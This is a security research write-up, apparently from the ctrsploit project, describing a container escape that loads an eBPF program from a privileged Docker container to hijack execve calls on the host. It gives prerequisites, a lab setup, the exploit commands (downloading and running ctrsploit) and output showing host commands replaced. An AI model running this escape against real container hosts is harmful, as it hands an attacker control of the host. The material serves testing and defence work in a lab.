---
maintainer:
    - ssst0n3
---
# ebpf escape by hooking execve syscall

## 1. Vulnerability Introduction

This vulnerability describes a container escape method that leverages eBPF.

When a container is granted excessive privileges (such as CAP_SYS_ADMIN or CAP_BPF), an attacker can load a malicious eBPF program into the host's kernel from within the container.

This eBPF program can inject evil command by replacing the first arg of execve.

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

vulnerability exists:
* CAP_BND: CAP_SYS_ADMIN / CAP_BPF

vulnerability exploitable:
* CAP_EFF: CAP_SYS_ADMIN

## 4. Vulnerability Existence Check

`ctrsploit checksec ebpf`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2/
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker version
Client: Docker Engine - Community
 Version:           19.03.13
 API version:       1.40
 Go version:        go1.13.15
 Git commit:        4484c46d9d
 Built:             Wed Sep 16 17:02:52 2020
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.13
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.13.15
  Git commit:       4484c46d9d
  Built:            Wed Sep 16 17:01:20 2020
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.3.7
  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175
 runc:
  Version:          1.0.0-rc10
  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
root@localhost:~# cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

</details>

### 5.2 Reproduce Steps

startup ebpf

```shell
$ ./ssh
root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps sys_admin x ebpf execve -p /bin/ls
INFO[0000] Waiting for events..
```

run command on host

```shell
$ ./ssh
root@localhost:~# cd /
root@localhost:/# whoami
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
root@localhost:/# id
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
```

## 6. Advance

### 6.1 Success Rate

This exploit may fail if the args for execve are not writable.
But fortunately, execve is called frequently, so it will succeed in a short time.

e.g. replace the command with "/bin/ls"

```shell
root@localhost:/# whoami
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
root@localhost:/# whoami
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
root@localhost:/# whoami
root
root@localhost:/# whoami
bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
```

### 6.2 --relative

use `--relative` or `-r` option, to let ctrsploit auto build the host path of a container path.

```shell
/ # ctrsploit vul caps sys_admin x ebpf execve -p /aaa -r 
INFO[0000] Waiting for events..                         
INFO[0000] Host pid: 250903                             
INFO[0000] set up command as: "/proc/250903/root/aaa\x00" 
INFO[0003] pid: 250910, pathname: /usr/bin/id, injected: true 
```
